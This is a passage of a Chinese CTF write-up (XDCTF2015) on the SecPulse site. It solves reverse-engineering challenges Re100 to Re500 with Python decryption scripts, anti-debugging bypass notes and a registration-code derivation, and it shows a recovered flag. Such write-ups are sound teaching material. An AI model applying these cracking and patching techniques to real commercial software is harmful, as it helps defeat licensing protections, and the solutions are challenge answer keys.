<p>第二步位置变换</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/2.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re100-2.png"><img class="alignnone size-full wp-image-38587" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re100-2.png" alt="Re100-2" width="782" height="684" /></a></p>
<p>第三步判断异或之后如果小于0x1f,就加0x20</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/3.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re100-3.png"><img class="alignnone size-full wp-image-38588" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re100-3.png" alt="Re100-3" width="886" height="471" /></a></p>
<p>最 后结果与[0x3B, 0x25, 0x23, 0x38, 0x34, 0x38, 0x4E, 0x21, 0x30, 0x5A, 0x3F, 0x37, 0x27, 0x25, 0x32, 0x33, 0x5D, 0x2F, 0x35, 0x23, 0x31, 0x22, 0x59, 0x58]比较</p>
<p>解密代码：</p>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;#coding=utf-8 key = [0x3B, 0x25, 0x23, 0x38, 0x34, 0x38, 0x4E, 0x21, 0x30, 0x5A, 0x3F, 0x37, 0x27, 0x25, 0x32, 0x33, 0x5D, 0x2F, 0x35, 0x23, 0x31, 0x22, 0x59, 0x58] res = &quot;&quot; key2 = &quot;ZzAwZF9DcjRrM3JfZzBfb24=&quot; for i in range(24):     if key[i] &amp;gt; 0x1f and key[i] &amp;lt;= 0x3f:         key[i] = key[i] - 0x20 print key for i in range(12):     tmp = key[i]     key[i] = key[17 - i]     key[17 - i] = tmp print key print key2 for i in range(12):     res += chr(key[i] ^ ord(key2[i])) print res print len(res) &lt;/code&gt;&lt;/pre&gt;">#coding=utf-8


key = [0x3B, 0x25, 0x23, 0x38, 0x34, 0x38, 0x4E, 0x21, 0x30, 0x5A, 0x3F, 0x37, 0x27, 0x25, 0x32, 0x33, 0x5D, 0x2F, 0x35, 0x23, 0x31, 0x22, 0x59, 0x58]
res = ""
key2 = "ZzAwZF9DcjRrM3JfZzBfb24="

for i in range(24):
    if key[i] &gt; 0x1f and key[i] &lt;= 0x3f:
        key[i] = key[i] - 0x20

print key
for i in range(12):
    tmp = key[i]
    key[i] = key[17 - i]
    key[17 - i] = tmp

print key
print key2

for i in range(12):
    res += chr(key[i] ^ ord(key2[i]))


print res
print len(res)
</code></pre>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/4.png" alt="" /><br />
转为小写即可</p>
<h2 id="re200">Re200</h2>
<p>代码加密保存，运行时解密，首先ida找到被加密代码的地方，od运行起来之后代码被解密，下断，第二次运行时先禁用断点，运行起来，激活断点就可以断在比较XDCTF的地方</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/5.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re200-1.png"><img class="alignnone size-full wp-image-38589" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re200-1.png" alt="Re200-1" width="681" height="506" /></a></p>
<p>根据代码一部分一部分修正输入即可复原处flag</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/6.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re200-2.png"><img class="alignnone size-full wp-image-38590" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re200-2.png" alt="Re200-2" width="851" height="556" /></a></p>
<p>flag: XDCTF{Congra_tUlat$eyOu}</p>
<h2 id="re400"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#re400" name="re400"></a>Re400</h2>
<p>输入的name,key全转为大写</p>
<p>计算machine code</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/7.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-1.png"><img class="alignnone size-full wp-image-38591" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-1.png" alt="Re400-1" width="599" height="524" /></a></p>
<p>通过name计算一个35位的key</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/8.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-2.png"><img class="alignnone size-full wp-image-38592" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-2.png" alt="Re400-2" width="667" height="584" /></a></p>
<p>把machine code、name计算得到的key和输入的key转存在这里，每个字符用一个dword存放</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/9.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-3.png"><img class="alignnone size-full wp-image-38593" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-3.png" alt="Re400-3" width="155" height="456" /></a></p>
<p>变换name计算出的key的顺序</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/10.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-4.png"><img class="alignnone size-full wp-image-38594" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-4.png" alt="Re400-4" width="622" height="567" /></a></p>
<p>通过machine code计算出一块数据(a)<br />
<img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/18.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-5.png"><img class="alignnone size-full wp-image-38595" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-5.png" alt="Re400-5" width="631" height="766" /></a></p>
<p>触发异常，进入SEH</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/11.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-6.png"><img class="alignnone size-full wp-image-38596" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-6.png" alt="Re400-6" width="432" height="129" /></a></p>
<p>检测CC断点</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/12.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-7.png"><img class="alignnone size-full wp-image-38597" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-7.png" alt="Re400-7" width="600" height="165" /></a></p>
<p>用代码段的代码的二进制填充一段缓冲区</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/15.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-8.png"><img class="alignnone size-full wp-image-38598" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-8.png" alt="Re400-8" width="551" height="787" /></a></p>
<p>上一步提到的缓冲区经过运算变形(b)</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/16.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-9.png"><img class="alignnone size-full wp-image-38599" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-9.png" alt="Re400-9" width="488" height="513" /></a></p>
<p>通过之前的数据(a)(b)计算查表得到最终的注册码</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/17.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-10.png"><img class="alignnone size-full wp-image-38600" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re400-10.png" alt="Re400-10" width="598" height="349" /></a></p>
<p>&nbsp;</p>
<h2>Re500</h2>
<p>很快定位到关键代码。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Rev500.jpg"><img class="alignnone size-full wp-image-38602" src="http://www.secpulse.com/wp-content/uploads/2015/10/Rev500.jpg" alt="Rev500" width="1563" height="356" /></a><br />
经过分析，程序调用的 3 个 GetDlgItemTextA 中只有第一个是有用的，另外两个没用，只会<br />
导致程序提前推出，需要通过 patch 或者通过调试器跳过那两个函数调用。<br />
之后就是纯分析算法了。<br />
程序中使用了很多浮点指令，通过调试器查看内存，大概也能理清楚。<br />
程序中有个 des 解密函数，并且在解密前后作者打印出了明文和密文。<br />
最后函数过程大致如下:</p>
<pre>from zio import *
import pyDes

input = '12345678901234567890123456789012'
plain_text = UNHEX(input)
print len(plain_text)
key = "\x34\x45\x86\x99\x1a\x4b\xcd\xa5"
des = pyDes.des(key)
crypt_text = (des.decrypt(plain_text))
print len(crypt_text)
#need crypt_text[0x10:0x18] == '\x08' * 8
final = ''
for i in range(16):
	index = (i + 2) % 16
	final += crypt_text[index:index + 1]
final2 = ''
for i in range(16):
	final2 += chr(l8(final[i:i+1])^0xe4)
#need final2 == mc
</pre>
<p>写了个逆向过程：</p>
<pre>from zio import *
import pyDes
mc = UNHEX('D85EB0EEE39E5DFE6279FFC555AC8621')
final = ''
for i in range(16):
	final += chr(l8(mc[i:i+1])^0xe4)
crypt_text = final[2:16]+final[0:2]
crypt_text += '\x08'*8
key = "\x34\x45\x86\x99\x1a\x4b\xcd\xa5"
des = pyDes.des(key)
plain_text = des.encrypt(crypt_text)
print len(plain_text)
print HEX(plain_text).upper()
</pre>
<p>关注往年战题，2014年第五届全国网络安全大赛（XDCTF）参见：<a href="http://www.secpulse.com/archives/1153.html" target="_blank">XDCTF2014 Writeup之Web和Crack篇</a></p>
<p>【作者：InkSec &amp; syclover  <a href="http://www.secpulse.com/archives/38544.html" target="_blank">安全脉搏SP小编整理编辑发布</a>】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/240610708" rel="tag">240610708</a><a href="https://www.secpulse.com/archives/tag/aabc9rqs" rel="tag">aabC9RqS</a><a href="https://www.secpulse.com/archives/tag/aabg7xss" rel="tag">aabg7XSs</a><a href="https://www.secpulse.com/archives/tag/braiontools" rel="tag">braiontools</a><a href="https://www.secpulse.com/archives/tag/git%e6%b3%84%e9%9c%b2" rel="tag">git泄露</a><a href="https://www.secpulse.com/archives/tag/inksec" rel="tag">InkSec</a><a href="https://www.secpulse.com/archives/tag/lu5631209" rel="tag">lu5631209</a><a href="https://www.secpulse.com/archives/tag/phpjm" rel="tag">PHPJM</a><a href="https://www.secpulse.com/archives/tag/pwn100" rel="tag">pwn100</a><a href="https://www.secpulse.com/archives/tag/qnkcdzo" rel="tag">QNKCDZO</a><a href="https://www.secpulse.com/archives/tag/rip-git-pl" rel="tag">rip-git.pl</a><a href="https://www.secpulse.com/archives/tag/syclover" rel="tag">syclover</a><a href="https://www.secpulse.com/archives/tag/xdctf" rel="tag">XDCTF</a><a href="https://www.secpulse.com/archives/tag/xdctf2015" rel="tag">XDCTF2015</a><a href="https://www.secpulse.com/archives/tag/xdctf2015-writeup" rel="tag">XDCTF2015 WriteUp</a><a href="https://www.secpulse.com/archives/tag/xdsec-cms" rel="tag">XDSEC-CMS</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/57956.html" title="详细阅读 SSCTF2017 WriteUp">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/05/SSCTF.jpg&h=150&w=249&zc=1" alt="SSCTF2017 WriteUp" class="xg-img"/>
		<p>SSCTF2017 WriteUp</P></a></li>
				<li><a href="https://www.secpulse.com/archives/39020.html" title="详细阅读 书安SecBook 第二期《信息安全攻防赛》">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/10/secbook.png&h=150&w=249&zc=1" alt="书安SecBook 第二期《信息安全攻防赛》" class="xg-img"/>
		<p>书安SecBook 第二期《信息安全攻防&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/38622.html" title="详细阅读 CTF主办方指南之对抗搅屎棍">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/10/01-1024x333.png&h=150&w=249&zc=1" alt="CTF主办方指南之对抗搅屎棍" class="xg-img"/>
		<p>CTF主办方指南之对抗搅屎棍</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
		<h2 class="comments-title">
		2条评论
	</h2>
<!-- 显示正在加载新评论 -->
 <div id="loading-comments"><span>评论加载中，请稍等...</span></div>
	<ul class="commentlist">
			
	<li class="comment byuser comment-author-60duxiangshang even thread-even depth-1 parent" id="comment-5365">
	<div class="comment-author"><img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="40" height="40" alt="" class="avatar avatar-40wp-user-avatar wp-user-avatar-40 alignnone photo avatar-default" /></div>
			<div id="div-comment-5365" class="commenttext">
		<div class="commentmeta">
		
		<!--<cite class="fn">60duxiangshang</cite> <span class="says">:</span>-->
		<span class="commentid">60duxiangshang</span>
		<span class="comment-meta commentmetadata">
			<a href="https://www.secpulse.com/archives/38544.html#comment-5365"></a>
			<span class="commenttime">
				2015年10月15日 下午7:33											
				</span>
			</span>
			<span class="reply">&nbsp;<a class='comment-reply-link' href='/archives/38544.html?replytocom=5365#respond' onclick='return addComment.moveForm( "comment-5365", "5365", "respond", "38544" )' aria-label='回复给60duxiangshang'>回复</a></span>
		</span>
	</div>
	<div class="commentp"><p>能不能添加一个收藏功能啊，好的文章可以收藏！</p>
</div>
			</div>
	<ul class="children">
	
	<li class="comment byuser comment-author-sp_editor odd alt depth-2" id="comment-5367">
	<div class="comment-author"><img src="https://www.secpulse.com/wp-content/uploads/2017/01/spediator-150x150.jpg" width="40" height="40" alt="SP小编" class="avatar avatar-40 wp-user-avatar wp-user-avatar-40 alignnone photo" /></div>
			<div id="div-comment-5367" class="commenttext">
		<div class="commentmeta">
		
		<!--<cite class="fn">SP小编</cite> <span class="says">:</span>-->
		<span class="commentid">SP小编</span>
		<span class="comment-meta commentmetadata">
			<a href="https://www.secpulse.com/archives/38544.html#comment-5367"></a>
			<span class="commenttime">
				2015年10月15日 下午8:00											
				</span>
			</span>
			<span class="reply">&nbsp;<a class='comment-reply-link' href='/archives/38544.html?replytocom=5367#respond' onclick='return addComment.moveForm( "comment-5367", "5367", "respond", "38544" )' aria-label='回复给SP小编'>回复</a></span>
		</span>
	</div>
	<div class="commentp"><p>@<a href="#comment-5365">60duxiangshang</a> 这个提议非常好 后续会加上这个功能</p>
</div>
			</div>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	</ul><!-- .comment-list -->

			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='38544' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="4d0f2a1379" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="170"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/38544.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2014/12/b_4216_20111222020023739433835-150x150.jpg" width="96" height="96" alt="SP胖编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_panbian" title="由SP胖编发布" rel="author">SP胖编</a><br>
 <span class="au-title">总共60篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
神器 神器 神器	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/38190.html" rel="bookmark" title="详细阅读 民生保险某分站存在SQL注入漏洞">民生保险某分站存在SQL注入漏洞</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/49305.html" rel="bookmark" title="详细阅读 一次对九元航空的渗透测试">一次对九元航空的渗透测试</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/8254.html" rel="bookmark" title="详细阅读 WordPress反射型XSS">WordPress反射型XSS</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/31466.html" rel="bookmark" title="详细阅读 滴滴打车（小桔科技）设计不当可导致撞库（有案例）">滴滴打车（小桔科技）设计不当可导致撞库（有案例）</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/14503.html" rel="bookmark" title="详细阅读 ESPCMS Local File Inclusion Vulnerability">ESPCMS Local File Inclusion Vulnerability</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
